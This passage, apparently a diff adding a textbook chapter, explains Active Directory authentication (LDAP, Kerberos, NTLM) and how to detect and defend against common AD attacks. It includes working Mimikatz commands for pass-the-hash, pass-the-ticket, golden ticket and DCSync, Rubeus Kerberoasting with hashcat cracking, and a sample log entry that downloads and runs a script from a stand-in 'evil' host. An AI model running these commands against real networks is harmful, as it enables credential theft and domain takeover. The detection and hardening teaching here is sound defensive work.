+<h3 id="ch03-374-gpo-group-policy-object">3.7.4. GPO — Group Policy Object</h3>
+<p>A GPO has 2 parts:
+- <strong>GPC (Group Policy Container)</strong>: an object in AD (<code>CN=Policies,CN=System,DC=...</code>), containing the version + GUID + CSE list.
+- <strong>GPT (Group Policy Template)</strong>: files on SYSVOL at <code>\\domain\SYSVOL\&lt;domain&gt;\Policies\{GUID}\</code> containing <code>gpt.ini</code>, <code>Registry.pol</code>, and scripts.</p>
+<p>The <strong>LSDOU</strong> application order: Local → Site → Domain → OU (later OUs override earlier ones, unless "Enforced"/"Block Inheritance" is set).</p>
+<pre><code class="language-powershell"># View the GPOs applied to the current user/machine
+gpresult /h C:\report.html /f
+
+# List the GPOs in the domain
+Get-GPO -All | Select DisplayName, Id, GpoStatus
+</code></pre>
+<blockquote>
+<p><strong>Note:</strong> SYSVOL is readable by every Authenticated User. History: GPP (<code>Groups.xml</code>) once contained passwords encrypted with AES using a <strong>public key</strong> (CVE-2014-1812) → anyone could decrypt them. Hunt for <code>cpassword</code> files in SYSVOL.</p>
+</blockquote>
+<h3 id="ch03-375-trust-trust-relationships">3.7.5. Trust — trust relationships</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Direction</th>
+<th>Transitive</th>
+<th>Used when</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Parent-Child</td>
+<td>Two-way</td>
+<td>Yes</td>
+<td>Within the same tree</td>
+</tr>
+<tr>
+<td>Tree-Root</td>
+<td>Two-way</td>
+<td>Yes</td>
+<td>Between trees in a forest</td>
+</tr>
+<tr>
+<td>External</td>
+<td>One-/two-way</td>
+<td>No</td>
+<td>To a domain outside the forest</td>
+</tr>
+<tr>
+<td>Forest</td>
+<td>One-/two-way</td>
+<td>Yes (within the partner forest)</td>
+<td>Between two forests</td>
+</tr>
+<tr>
+<td>Realm</td>
+<td>One-/two-way</td>
+<td>No</td>
+<td>To a non-Windows Kerberos realm</td>
+</tr>
+</tbody>
+</table>
+<p>Trusts use a <strong>trust key</strong> (inter-realm key) so that a DC on one side issues a <strong>referral TGT</strong> for the other side. Related attack: <strong>SID History</strong> + a cross-domain golden ticket to escalate privileges across a trust if SID filtering is not enabled.</p>
+<hr />
+<h2 id="ch03-38-ldap-the-ad-query-protocol">3.8. LDAP — the AD query protocol</h2>
+<h3 id="ch03-381-what-it-is-and-how-it-works">3.8.1. What it is and how it works</h3>
+<p>AD exposes its database via <strong>LDAP</strong> (RFC 4511) on TCP <strong>389</strong> (cleartext/StartTLS), <strong>636</strong> (LDAPS), and <strong>3268/3269</strong> (Global Catalog). LDAP uses <strong>BER/ASN.1</strong> encoding for messages.</p>
+<p>The structure of an <strong>LDAPMessage</strong> (ASN.1):</p>
+<pre><code>LDAPMessage ::= SEQUENCE {
+    messageID       INTEGER (0..maxInt),
+    protocolOp      CHOICE { bindRequest, searchRequest, searchResEntry, ... },
+    controls        [0] Controls OPTIONAL
+}
+</code></pre>
+<p>A <strong>searchRequest</strong> contains: <code>baseObject</code> (the base DN), <code>scope</code> (baseObject=0 / singleLevel=1 / wholeSubtree=2), <code>derefAliases</code>, <code>sizeLimit</code>, <code>timeLimit</code>, <code>filter</code>, and <code>attributes</code>.</p>
+<p>The search filter in RFC 4515 form:</p>
+<pre><code>(&amp;(objectClass=user)(sAMAccountName=jdoe))
+(&amp;(objectClass=user)(servicePrincipalName=*))     # find accounts with an SPN -&gt; Kerberoast
+(userAccountControl:1.2.840.113556.1.4.803:=4194304)  # DONT_REQ_PREAUTH bit -&gt; AS-REP roast
+</code></pre>
+<p><code>1.2.840.113556.1.4.803</code> is the <strong>matching rule OID LDAP_MATCHING_RULE_BIT_AND</strong> — filtering by the bits of <code>userAccountControl</code>.</p>
+<p>Important <code>userAccountControl</code> (UAC) flags:</p>
+<table>
+<thead>
+<tr>
+<th>Bit (hex)</th>
+<th>Name</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x0002</td>
+<td>ACCOUNTDISABLE</td>
+<td>Account disabled</td>
+</tr>
+<tr>
+<td>0x0200</td>
+<td>NORMAL_ACCOUNT</td>
+<td>A normal user account</td>
+</tr>
+<tr>
+<td>0x10000</td>
+<td>DONT_EXPIRE_PASSWORD</td>
+<td>Password never expires</td>
+</tr>
+<tr>
+<td>0x400000 (4194304)</td>
+<td>DONT_REQ_PREAUTH</td>
+<td>Enables AS-REP roasting</td>
+</tr>
+<tr>
+<td>0x80000</td>
+<td>TRUSTED_FOR_DELEGATION</td>
+<td>Unconstrained delegation (dangerous)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-382-real-world-example">3.8.2. Real-world example</h3>
+<pre><code class="language-powershell"># Find accounts with an SPN (Kerberoasting targets) using native PowerShell
+([adsisearcher]&quot;(&amp;(objectClass=user)(servicePrincipalName=*))&quot;).FindAll() |
+  ForEach-Object { $_.Properties.samaccountname }
+</code></pre>
+<pre><code class="language-bash"># ldapsearch (Linux) — a simple bind, then a query
+ldapsearch -x -H ldap://10.0.0.10 -D &quot;CORP\jdoe&quot; -w 'Passw0rd!' \
+  -b &quot;DC=corp,DC=example,DC=com&quot; \
+  &quot;(&amp;(objectClass=user)(servicePrincipalName=*))&quot; sAMAccountName servicePrincipalName
+</code></pre>
+<blockquote>
+<p><strong>Note:</strong> cleartext LDAP on 389 exposes the bind credentials (simple bind). Microsoft recommends <strong>LDAP signing + channel binding</strong> (LDAPS) to prevent MITM/relay. Anomalous LDAP queries (enumerating all users/SPNs) are a sign of recon — detect them via the "Directory Service Access" audit (Event 4662) or network monitoring.</p>
+</blockquote>
+<hr />
+<h2 id="ch03-39-kerberos-authentication-step-by-step">3.9. Kerberos — authentication step by step</h2>
+<h3 id="ch03-391-what-it-is-and-its-components">3.9.1. What it is and its components</h3>
+<p>Kerberos v5 (RFC 4120) is the default authentication protocol in AD, based on tickets and <strong>symmetric encryption</strong>. Components:</p>
+<ul>
+<li><strong>KDC (Key Distribution Center)</strong> = runs on the DC, comprising the <strong>AS (Authentication Service)</strong> and the <strong>TGS (Ticket Granting Service)</strong>.</li>
+<li><strong>krbtgt</strong>: a special account; the hash of its password is the <strong>key that signs the TGT</strong>.</li>
+<li><strong>Principal</strong>: a user (<code>user@REALM</code>) or a service (<code>HTTP/web01.corp.com</code>).</li>
+</ul>
+<p>Port: TCP/UDP <strong>88</strong>.</p>
+<h3 id="ch03-392-the-three-phases-the-full-flow">3.9.2. The three phases — the full flow</h3>
+<pre><code>   CLIENT                         KDC (AS+TGS)                 SERVICE (web01)
+     |   (1) AS-REQ  -----------------&gt;|                            |
+     |   &lt;----------- (2) AS-REP  (TGT + session key)               |
+     |   (3) TGS-REQ (TGT + SPN) -----&gt;|                            |
+     |   &lt;----------- (4) TGS-REP (Service ticket + svc key)        |
+     |   (5) AP-REQ (Service ticket + Authenticator) --------------&gt;|
+     |   &lt;-------------------- (6) AP-REP (optional mutual auth)    |
+</code></pre>
+<p><strong>Phase 1 — AS-REQ (Authentication Service Request)</strong></p>
+<p>The client sends to the AS. The main fields in <code>KDC-REQ-BODY</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cname</code></td>
+<td>The client (user) name</td>
+</tr>
+<tr>
+<td><code>realm</code></td>
+<td>The realm (uppercase domain)</td>
+</tr>
+<tr>
+<td><code>sname</code></td>
+<td>The service name = <code>krbtgt/REALM</code></td>
+</tr>
+<tr>
+<td><code>till</code></td>
+<td>The requested expiration</td>
+</tr>
+<tr>
+<td><code>nonce</code></td>
+<td>A random number to prevent replay</td>
+</tr>
+<tr>
+<td><code>etype</code></td>
+<td>A list of preferred encryption types (AES256=18, AES128=17, RC4=23)</td>
+</tr>
+<tr>
+<td><code>padata</code></td>
+<td><strong>PA-ENC-TIMESTAMP</strong>: a timestamp encrypted with a key derived from the user's password (pre-authentication)</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Pre-authentication</strong>: the client proves it knows the password by encrypting the current timestamp. If an account has pre-auth disabled (the UAC bit DONT_REQ_PREAUTH) → the AS returns an AS-REP without requiring proof → <strong>AS-REP roasting</strong>.</p>
+</blockquote>
+<p><strong>Phase 2 — AS-REP</strong></p>
+<p>The AS returns:
+- The <strong>TGT (Ticket-Granting Ticket)</strong>: encrypted with the <strong>krbtgt key</strong> → the client CANNOT read its contents, only hold it. Inside it contains the session key, the client identity, and the <strong>PAC</strong>.
+- The <strong>enc-part</strong>: contains the <strong>TGS session key</strong>, encrypted with the user's key (which the client can decrypt).</p>
+<p>The structure of a <strong>Ticket</strong> (KRB_TGT/service ticket, RFC 4120):</p>
+<pre><code>Ticket ::= [APPLICATION 1] SEQUENCE {
+   tkt-vno         [0] INTEGER (5),
+   realm           [1] Realm,
+   sname           [2] PrincipalName,    -- krbtgt/REALM or an SPN
+   enc-part        [3] EncryptedData     -- encrypted with the service/krbtgt key
+}
+
+EncTicketPart (decrypted) ::= {
+   flags           -- forwardable, renewable, ...
+   key             -- session key
+   crealm, cname   -- the client identity
+   authtime, starttime, endtime, renew-till
+   authorization-data -- contains the PAC (AD-WIN2K-PAC)
+}
+</code></pre>
+<p><strong>Phase 3 — TGS-REQ</strong></p>
+<p>The client wants to access the service <code>HTTP/web01</code>. It sends to the TGS:
+- The TGT (which it cannot read) in the <code>padata</code> field (the AP-REQ wrapper).
+- An <strong>Authenticator</strong>: timestamp + cname, encrypted with the <strong>TGS session key</strong> (obtained from the AS-REP) → proving the client possesses the session key.
+- <code>sname</code> = <code>HTTP/web01.corp.com</code>.</p>
+<p><strong>Phase 4 — TGS-REP</strong></p>
+<p>The TGS decrypts the TGT with the krbtgt key, obtains the session key, verifies the authenticator, then issues a <strong>service ticket</strong> encrypted with the <strong>password hash of the service account</strong> (the account that owns the SPN). It includes the service session key (encrypted with the TGS session key).</p>
+<blockquote>
+<p><strong>Kerberoasting</strong> attacks here: any user can request a service ticket for any SPN. The service ticket is encrypted with the service account's hash → brute-force it offline to recover the service account password, especially when etype=RC4 (0x17).</p>
+</blockquote>
+<p><strong>Phase 5 — AP-REQ</strong></p>
+<p>The client sends the service ticket + an authenticator (encrypted with the service session key) to the service itself. The service decrypts the ticket with its own key, obtains the session key, and verifies the authenticator → authenticating the client. The service does <strong>not need to contact the KDC</strong>.</p>
+<h3 id="ch03-393-pac-privilege-attribute-certificate">3.9.3. PAC — Privilege Attribute Certificate</h3>
+<p>The PAC (MS-PAC) is embedded in the ticket's <code>authorization-data</code> and contains authorization information:</p>
+<table>
+<thead>
+<tr>
+<th>PAC component</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>KERB_VALIDATION_INFO</code> (Logon Info)</td>
+<td>User SID, <strong>list of group SIDs</strong>, RID, logon time</td>
+</tr>
+<tr>
+<td><code>PAC_CLIENT_INFO</code></td>
+<td>Name + time</td>
+</tr>
+<tr>
+<td><code>UPN_DNS_INFO</code></td>
+<td>UPN</td>
+</tr>
+<tr>
+<td><code>Server Signature</code></td>
+<td>An HMAC signed with the service's key</td>
+</tr>
+<tr>
+<td><code>KDC Signature</code></td>
+<td>An HMAC signed with the krbtgt key</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>The PAC is how Windows carries <strong>group/SID information</strong> into a ticket so the server can decide permissions without re-querying the DC. The <strong>MS14-068</strong> vulnerability once allowed forging the PAC (placing oneself in Domain Admins) because the server signature check was weak.</p>
+</blockquote>
+<h3 id="ch03-394-real-world-example">3.9.4. Real-world example</h3>
+<pre><code class="language-cmd">:: List the Kerberos tickets cached in the session
+klist
+
+:: Purge tickets (forcing a re-request) — useful when debugging
+klist purge
+</code></pre>
+<pre><code class="language-powershell"># Kerberoasting (Rubeus) — request a TGS for every SPN, export hashes to crack offline
+Rubeus.exe kerberoast /outfile:hashes.txt
+# Crack with hashcat mode 13100 (Kerberos 5 TGS-REP etype 23/RC4)
+# hashcat -m 13100 hashes.txt wordlist.txt
+</code></pre>
+<blockquote>
+<p><strong>Note:</strong> Kerberoasting leaves an <strong>Event 4769</strong> with <code>TicketEncryptionType=0x17</code> (RC4) and a <code>ServiceName</code> that is a user-SPN account. Many RC4 4769 events in a short time from one account = an alert.</p>
+</blockquote>
+<h3 id="ch03-395-consolidated-kerberos-security-notes">3.9.5. Consolidated Kerberos security notes</h3>
+<ul>
+<li>Disabling RC4 and forcing AES (etype 17/18) reduces the effectiveness of Kerberoasting.</li>
+<li>Use a <strong>gMSA (Group Managed Service Account)</strong> for service accounts, with a 120-character automatically rotated password → uncrackable.</li>
+<li>Reset <code>krbtgt</code> twice periodically to invalidate old golden tickets.</li>
+</ul>
+<hr />
+<h2 id="ch03-310-ntlm-challengeresponse">3.10. NTLM — Challenge/Response</h2>
+<h3 id="ch03-3101-the-3-step-mechanism">3.10.1. The 3-step mechanism</h3>
+<p>NTLM (NT LAN Manager) is the older protocol, used when Kerberos is unavailable (access by IP, machines not joined to a domain, workgroups). The three messages:</p>
+<pre><code>CLIENT                                   SERVER
+  | (1) NEGOTIATE_MESSAGE  -------------&gt;|   (advertise capabilities: flags)
+  | &lt;----------- (2) CHALLENGE_MESSAGE   |   (8-byte server nonce)
+  | (3) AUTHENTICATE_MESSAGE  ----------&gt;|   (NTLM response = HMAC over NT hash + challenge)
+</code></pre>
+<p><strong>Type 2 CHALLENGE_MESSAGE</strong> — the fields:</p>
+<table>
+<thead>
+<tr>
+<th>Offset</th>
+<th>Size</th>
+<th>Field</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x00</td>
+<td>8 bytes</td>
+<td>Signature</td>
+<td><code>NTLMSSP\0</code> (<code>4E 54 4C 4D 53 53 50 00</code>)</td>
+</tr>
+<tr>
+<td>0x08</td>
+<td>4 bytes</td>
+<td>MessageType</td>
+<td><code>0x00000002</code></td>
+</tr>
+<tr>
+<td>0x0C</td>
+<td>8 bytes</td>
+<td>TargetName fields</td>
+<td>len/maxlen/offset</td>
+</tr>
+<tr>
+<td>0x14</td>
+<td>4 bytes</td>
+<td>NegotiateFlags</td>
+<td>The negotiation flags</td>
+</tr>
+<tr>
+<td>0x18</td>
+<td>8 bytes</td>
+<td><strong>ServerChallenge</strong></td>
+<td>A random 8-byte nonce</td>
+</tr>
+<tr>
+<td>0x20</td>
+<td>8 bytes</td>
+<td>Reserved</td>
+<td>-</td>
+</tr>
+<tr>
+<td>0x28</td>
+<td>8 bytes</td>
+<td>TargetInfo fields</td>
+<td>AV_PAIR (domain name, machine, ...)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>NTLMv2 response</strong> (in AUTHENTICATE): the client computes
+<code>NTProofStr = HMAC-MD5(NTLMv2Hash, ServerChallenge || blob)</code>
+where <code>NTLMv2Hash = HMAC-MD5(NT-Hash, uppercase(user) || domain)</code>. The NT-Hash = <code>MD4(UTF-16LE(password))</code>.</p>
+<blockquote>
+<p><strong>Note:</strong> the server never sees the password, only the NT hash indirectly via the response. But if an attacker has the <strong>NT hash</strong>, they can compute the response without the password → this is exactly the basis of <strong>pass-the-hash</strong>.</p>
+</blockquote>
+<h3 id="ch03-3102-ntlm-vs-kerberos-comparison">3.10.2. NTLM vs Kerberos comparison</h3>
+<table>
+<thead>
+<tr>
+<th>Criterion</th>
+<th>NTLM</th>
+<th>Kerberos</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Model</td>
+<td>Challenge/response</td>
+<td>Ticket</td>
+</tr>
+<tr>
+<td>Mutual auth</td>
+<td>No (by default)</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Third party</td>
+<td>Not needed (the server asks the DC via Netlogon)</td>
+<td>The KDC is needed</td>
+</tr>
+<tr>
+<td>Use IP instead of name</td>
+<td>Possible</td>
+<td>No (requires SPN/DNS)</td>
+</tr>
+<tr>
+<td>Replay</td>
+<td>Weaker</td>
+<td>Has timestamp + nonce</td>
+</tr>
+<tr>
+<td>Characteristic attacks</td>
+<td>Pass-the-hash, NTLM relay</td>
+<td>Pass-the-ticket, Kerberoast, golden ticket</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Note:</strong> NTLM authentication at the DC generates <strong>Event 4776</strong>. NTLM relay (forwarding the challenge/response to another machine) is a major attack — defend against it with SMB signing + EPA (Extended Protection for Authentication) + disabling NTLM where possible.</p>
+</blockquote>
+<hr />
+<h2 id="ch03-311-active-directory-attacks-and-their-event-id-signatures">3.11. Active Directory attacks and their Event ID signatures</h2>
+<p>(Full attack context: <a href="ch15.html">Chapter 15</a>; detection and monitoring techniques: <a href="ch10.html">Chapter 10</a>.)</p>
+<h3 id="ch03-3111-pass-the-hash-pth">3.11.1. Pass-the-Hash (PtH)</h3>
+<p><strong>Mechanism</strong>: use the NT hash directly (no plaintext needed) to complete NTLM authentication to a remote service (SMB, WMI).</p>
+<pre><code class="language-cmd">:: Mimikatz: create a new logon session carrying the NT hash
+sekurlsa::pth /user:Administrator /domain:CORP /ntlm:32ed87bdb5fdc5e9cba88547376818d4 /run:cmd.exe
+</code></pre>
+<p><strong>Signature</strong>: Event <strong>4624 Logon Type 9</strong> + <code>LogonProcessName=seclogo</code> + <code>AuthenticationPackageName=Negotiate</code>; usually followed by <strong>4624 Type 3</strong> on the target machine accompanied by 4672 (privileges).</p>
+<h3 id="ch03-3112-pass-the-ticket-ptt">3.11.2. Pass-the-Ticket (PtT)</h3>
+<p><strong>Mechanism</strong>: extract a TGT/service ticket from memory, then inject it into another session.</p>
+<pre><code class="language-cmd">:: Mimikatz: dump then re-inject the ticket
+sekurlsa::tickets /export
+kerberos::ptt [0;abc]-2-0-...-Administrator@krbtgt-CORP.kirbi
+</code></pre>
+<p><strong>Signature</strong>: a Kerberos ticket used from a machine/IP that does not match the original 4768; missing the 4768 that should correspond to the Kerberos activity.</p>
+<h3 id="ch03-3113-kerberoasting-as-rep-roasting">3.11.3. Kerberoasting / AS-REP Roasting</h3>
+<p>The mechanism was described in 3.9. Signature summary:</p>
+<table>
+<thead>
+<tr>
+<th>Attack</th>
+<th>Event</th>
+<th>Indicator fields</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Kerberoasting</td>
+<td>4769</td>
+<td><code>TicketEncryptionType=0x17</code>, ServiceName is a user account with an SPN</td>
+</tr>
+<tr>
+<td>AS-REP roasting</td>
+<td>4768</td>
+<td><code>PreAuthType=0</code>, the account has the UAC bit DONT_REQ_PREAUTH</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-powershell"># AS-REP roasting (Rubeus): find accounts that do not require pre-auth
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+# hashcat -m 18200 asrep.txt wordlist.txt
+</code></pre>
+<h3 id="ch03-3114-golden-ticket-and-silver-ticket">3.11.4. Golden Ticket and Silver Ticket</h3>
+<table>
+<thead>
+<tr>
+<th>Criterion</th>
+<th>Golden Ticket</th>
+<th>Silver Ticket</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Forges</td>
+<td>TGT</td>
+<td>Service ticket</td>
+</tr>
+<tr>
+<td>Key required</td>
+<td><strong>krbtgt NT hash</strong></td>
+<td>NT hash of the <strong>service account</strong></td>
+</tr>
+<tr>
+<td>Scope</td>
+<td>The whole domain (any service)</td>
+<td>One specific service</td>
+</tr>
+<tr>
+<td>Contacts the KDC</td>
+<td>No (when used)</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Detection</td>
+<td>Hard (a valid TGT); hunt for anomalous TGT lifetimes, no 4768 before 4769</td>
+<td>Similar but limited to 1 SPN</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-cmd">:: Golden ticket (Mimikatz) — needs the krbtgt hash + domain SID
+kerberos::golden /user:Administrator /domain:corp.example.com ^
+  /sid:S-1-5-21-...-1107 /krbtgt:&lt;krbtgt_NTLM_hash&gt; /ptt
+</code></pre>
+<blockquote>
+<p><strong>Why:</strong> the golden ticket is all-powerful because the TGT is signed with the krbtgt key. If an attacker has the krbtgt hash, they can issue their own TGT with a PAC containing the Domain Admins SID and a 10-year lifetime. Only resetting krbtgt (twice) invalidates it.</p>
+</blockquote>
+<h3 id="ch03-3115-dcsync">3.11.5. DCSync</h3>
+<p><strong>Mechanism</strong>: impersonate a DC and call the <strong>DRSUAPI</strong> RPC <code>DRSGetNCChanges</code> (<code>IDL_DRSGetNCChanges</code>) to request replication of secret data (the hashes of all accounts, including krbtgt). This requires the <strong>Replicating Directory Changes</strong> (+ All) right on the domain head.</p>
+<pre><code class="language-cmd">:: Mimikatz: pull the krbtgt hash via replication
+lsadump::dcsync /domain:corp.example.com /user:krbtgt
+</code></pre>
+<p><strong>Signature</strong>: Event <strong>4662</strong> on the DC with <code>Properties</code> containing the GUID of a control access right:
+- <code>1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</code> (DS-Replication-Get-Changes)
+- <code>1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</code> (DS-Replication-Get-Changes-All)
+- <code>89e95b76-444d-4c62-991a-0facbeda640c</code> (DS-Replication-Get-Changes-In-Filtered-Set)</p>
+<p>When the <code>AccessMask</code> contains these GUIDs from a principal that is <strong>not a DC</strong> = DCSync is in progress.</p>
+<h3 id="ch03-3116-consolidated-signature-table">3.11.6. Consolidated signature table</h3>
+<table>
+<thead>
+<tr>
+<th>Attack</th>
+<th>Main Event ID</th>
+<th>Core indicator</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Pass-the-Hash</td>
+<td>4624 (Type 9), 4776</td>
+<td>LogonProcessName seclogo</td>
+</tr>
+<tr>
+<td>Pass-the-Ticket</td>
+<td>4624/4769 not matching 4768</td>
+<td>Ticket used from an unfamiliar host</td>
+</tr>
+<tr>
+<td>Kerberoasting</td>
+<td>4769</td>
+<td>EncType 0x17, user-account SPN</td>
+</tr>
+<tr>
+<td>AS-REP Roasting</td>
+<td>4768</td>
+<td>PreAuthType 0</td>
+</tr>
+<tr>
+<td>Golden Ticket</td>
+<td>4769 with no preceding 4768</td>
+<td>Anomalous TGT lifetime</td>
+</tr>
+<tr>
+<td>DCSync</td>
+<td>4662</td>
+<td>Replication GUID from a non-DC</td>
+</tr>
+<tr>
+<td>Service install (PsExec)</td>
+<td>7045, 4697</td>
+<td>Unfamiliar binPath</td>
+</tr>
+<tr>
+<td>Log clear</td>
+<td>1102, 104</td>
+<td>SubjectUserName</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="ch03-312-powershell-logging">3.12. PowerShell Logging</h2>
+<h3 id="ch03-3121-three-logging-tiers">3.12.1. Three logging tiers</h3>
+<table>
+<thead>
+<tr>
+<th>Tier</th>
+<th>Event ID / Log</th>
+<th>What it records</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Module Logging</strong></td>
+<td>4103 (Microsoft-Windows-PowerShell/Operational)</td>
+<td>Pipeline + command parameters per module</td>
+</tr>
+<tr>
+<td><strong>Script Block Logging</strong></td>
+<td><strong>4104</strong> (same log)</td>
+<td>The full <strong>de-obfuscated</strong> script block content before it runs</td>
+</tr>
+<tr>
+<td><strong>Transcription</strong></td>
+<td>A text file</td>
+<td>All input/output to a file</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-3122-enabling-via-gpo-registry">3.12.2. Enabling via GPO / Registry</h3>
+<pre><code class="language-cmd">:: Script Block Logging (the strongest — even records base64-decoded commands)
+reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging&quot; ^
+  /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
+
+:: Module Logging
+reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging&quot; ^
+  /v EnableModuleLogging /t REG_DWORD /d 1 /f
+
+:: Transcription to a file
+reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription&quot; ^
+  /v EnableTranscripting /t REG_DWORD /d 1 /f
+</code></pre>
+<blockquote>
+<p><strong>Why:</strong> 4104 is powerful because attackers often use <code>powershell -enc &lt;base64&gt;</code> to hide commands. Script Block Logging records the content <strong>after decoding</strong>, so it reveals the real command. An Event 4104 with <code>Level=Warning</code> is automatically flagged by the engine when it detects a suspicious pattern (Invoke-Mimikatz, IEX, DownloadString, ...).</p>
+</blockquote>
+<p>A sample Event 4104:</p>
+<pre><code class="language-xml">&lt;EventData&gt;
+  &lt;Data Name=&quot;MessageNumber&quot;&gt;1&lt;/Data&gt;
+  &lt;Data Name=&quot;MessageTotal&quot;&gt;1&lt;/Data&gt;
+  &lt;Data Name=&quot;ScriptBlockText&quot;&gt;IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')&lt;/Data&gt;
+  &lt;Data Name=&quot;ScriptBlockId&quot;&gt;{...}&lt;/Data&gt;
+&lt;/EventData&gt;
+</code></pre>
+<blockquote>
+<p><strong>Note:</strong> attackers downgrade to PowerShell v2 (<code>powershell -version 2</code>) to evade script block logging (v2 does not support it). Defense: remove the .NET 2.0/PowerShell v2 engine. AMSI (Antimalware Scan Interface) adds runtime scanning of script content; attackers use AMSI bypasses → monitor for the characteristic bypass strings.</p>
+</blockquote>
+<hr />
+<h2 id="ch03-313-laps-and-the-tiering-model">3.13. LAPS and the Tiering Model</h2>
+<h3 id="ch03-3131-laps-local-administrator-password-solution">3.13.1. LAPS — Local Administrator Password Solution</h3>
+<p><strong>The problem it solves</strong>: identical local admin passwords across all machines → a single PtH spreads across the whole domain. LAPS sets a <strong>random, per-machine</strong> local admin password, stores it in AD, and rotates it automatically.</p>
+<p><strong>Mechanism</strong> (classic LAPS):
+- Extends the schema with 2 attributes on the computer object:
+  - <code>ms-Mcs-AdmPwd</code>: the plaintext password (protected by an ACL — only that machine can write it; delegated admins can read it).
+  - <code>ms-Mcs-AdmPwdExpirationTime</code>: the expiration time (FILETIME).
+- The CSE (client-side extension) runs per GPO: if expired → generate a new password, set it for the local admin, and write it up to AD.</p>
+<p><strong>Windows LAPS (new, 2023)</strong>: built in, stores the <code>msLAPS-Password</code> attribute, supports <strong>password encryption</strong> (DPAPI-NG, decryptable only by the delegated group), and can also store into Entra ID.</p>
+<pre><code class="language-powershell"># Read a machine's LAPS password (requires delegated permission)
+Get-AdmPwdPassword -ComputerName WS01            # classic LAPS
+Get-LapsADPassword -Identity WS01 -AsPlainText   # Windows LAPS
+</code></pre>
+<blockquote>
+<p><strong>Note:</strong> the <code>ms-Mcs-AdmPwd</code> attribute is protected by an ACL + usually marked "confidential". You must verify that read access is <strong>not inadvertently granted</strong> to a broad group. Audit LAPS reads (Event 4662 on that attribute).</p>
+</blockquote>
+<h3 id="ch03-3132-the-tiering-model-microsoft-tiering-enterprise-access-model">3.13.2. The tiering model (Microsoft Tiering / Enterprise Access Model)</h3>
+<p>Principle: <strong>high-tier credentials must never touch low-tier machines</strong>.</p>
+<table>
+<thead>
+<tr>
+<th>Tier</th>
+<th>Assets</th>
+<th>Administrative accounts</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Tier 0</strong></td>
+<td>DCs, AD CS, ADFS, identity control systems</td>
+<td>Domain/Enterprise Admins</td>
+</tr>
+<tr>
+<td><strong>Tier 1</strong></td>
+<td>Servers, applications, data</td>
+<td>Server admins</td>
+</tr>
+<tr>
+<td><strong>Tier 2</strong></td>
+<td>Workstations, user devices</td>
+<td>Helpdesk/workstation admins</td>
+</tr>
+</tbody>
+</table>
+<p>Rules:
+- Tier 0 admins only log on to a <strong>Privileged Access Workstation (PAW)</strong> and to DCs.
+- Do not use a Tier 0 account to RDP into a workstation (because the hash would reside in the LSASS of the Tier 2 machine, easy to dump).
+- Use <strong>Authentication Policy Silos</strong> + the <strong>Protected Users group</strong> (forbids NTLM, forbids delegation, forces Kerberos AES, does not cache credentials) for sensitive accounts.</p>
+<pre><code class="language-powershell"># Add an admin to Protected Users (defends against PtH/PtT for that account)
+Add-ADGroupMember -Identity &quot;Protected Users&quot; -Members &quot;tier0-admin&quot;
+
+# Create an Authentication Policy limiting TGT lifetime to a short window
+New-ADAuthenticationPolicy -Name &quot;T0-Policy&quot; `
+  -UserTGTLifetimeMins 240 -ProtectedFromAccidentalDeletion $true
+</code></pre>
+<blockquote>
+<p><strong>Why:</strong> tiering is effective because most AD attacks rely on <strong>horizontal/vertical credential reuse</strong> (taking an admin's hash from one compromised machine and using it against the DC). Isolating credentials by tier breaks this chain even when one machine is compromised. Protected Users + LSA Protection (<code>RunAsPPL</code>) + Credential Guard (isolating secrets in VBS/VTL1) are additional technical defensive layers against LSASS dumping.</p>
+</blockquote>
+<h3 id="ch03-3133-credential-guard-and-lsa-protection">3.13.3. Credential Guard and LSA Protection</h3>
+<ul>
+<li><strong>LSA Protection (RunAsPPL)</strong>: runs <code>lsass.exe</code> as a <strong>Protected Process Light</strong> → other processes (even admins) cannot open a handle to read its memory → blocks Mimikatz <code>sekurlsa</code>.
+  <code>cmd
+  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f</code></li>
+<li><strong>Credential Guard</strong>: uses virtualization-based security (Hyper-V VTL1) to isolate NTLM hashes + Kerberos TGTs in <strong>LSAIso</strong>, which user-mode LSASS cannot access → PtH/PtT on that machine is neutralized.</li>
+</ul>
+<blockquote>
+<p><strong>Warning:</strong> if Sysmon Event 10 still shows a PROCESS_VM_READ handle to lsass.exe while RunAsPPL is enabled, it means the attacker loaded a driver to strip the PPL protection (BYOVD) — a high-priority alert.</p>
+</blockquote>
+<hr />
+<h2 id="ch03-314-summary-layered-defense">3.14. Summary: layered defense</h2>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Measure</th>
